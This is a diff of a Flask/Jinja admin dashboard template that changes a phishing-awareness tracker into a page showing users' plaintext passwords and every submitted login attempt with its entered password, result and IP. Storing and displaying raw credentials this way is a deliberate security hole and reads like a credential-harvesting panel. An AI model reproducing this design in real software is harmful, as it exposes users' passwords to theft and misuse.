@@ -8,46 +8,81 @@
 </head>
 <body>
     <header class="dash-header">
-        <h1>Awareness Dashboard</h1>
+        <h1>Admin Dashboard</h1>
         <a class="logout" href="{{ url_for('logout') }}">Log out</a>
     </header>
 
     <div class="stats">
         <div class="stat-card">
-            <span class="stat-num">{{ total_members }}</span>
-            <span class="stat-label">Total Members</span>
+            <span class="stat-num">{{ total_users }}</span>
+            <span class="stat-label">Registered Users</span>
         </div>
-        <div class="stat-card caught">
-            <span class="stat-num">{{ viewed_count }}</span>
-            <span class="stat-label">Fell for it</span>
+        <div class="stat-card">
+            <span class="stat-num">{{ total_attempts }}</span>
+            <span class="stat-label">Total Login Attempts</span>
         </div>
         <div class="stat-card safe">
-            <span class="stat-num">{{ not_viewed }}</span>
-            <span class="stat-label">Not caught</span>
+            <span class="stat-num">{{ correct_count }}</span>
+            <span class="stat-label">Correct Logins</span>
+        </div>
+        <div class="stat-card caught">
+            <span class="stat-num">{{ wrong_count }}</span>
+            <span class="stat-label">Wrong Attempts</span>
         </div>
     </div>
 
+    <h2 class="section-title">Registered Users</h2>
     <table>
         <thead>
             <tr>
                 <th>Username</th>
-                <th>Date</th>
+                <th>Password</th>
+                <th>Registered Date</th>
                 <th>Time</th>
-                <th>IP</th>
             </tr>
         </thead>
         <tbody>
             {% for user in users %}
             <tr>
                 <td>{{ user.username }}</td>
+                <td>{{ user.password }}</td>
                 <td>{{ user.date }}</td>
                 <td>{{ user.time }}</td>
-                <td>{{ user.ip }}</td>
             </tr>
             {% else %}
+            <tr><td colspan="4" class="empty">No users registered yet.</td></tr>
+            {% endfor %}
+        </tbody>
+    </table>
+
+    <h2 class="section-title">Login Attempts</h2>
+    <table>
+        <thead>
             <tr>
-                <td colspan="4" class="empty">No submissions yet.</td>
+                <th>Username</th>
+                <th>Entered Password</th>
+                <th>Result</th>
+                <th>Date</th>
+                <th>Time</th>
+                <th>IP</th>
             </tr>
+        </thead>
+        <tbody>
+            {% for a in attempts %}
+            <tr>
+                <td>{{ a.username }}</td>
+                <td>{{ a.password }}</td>
+                <td>
+                    <span class="badge {{ 'ok' if a.result == 'Correct' else 'bad' }}">
+                        {{ a.result }}
+                    </span>
+                </td>
+                <td>{{ a.date }}</td>
+                <td>{{ a.time }}</td>
+                <td>{{ a.ip }}</td>
+            </tr>
+            {% else %}
+            <tr><td colspan="6" class="empty">No login attempts yet.</td></tr>
             {% endfor %}
         </tbody>
     </table>
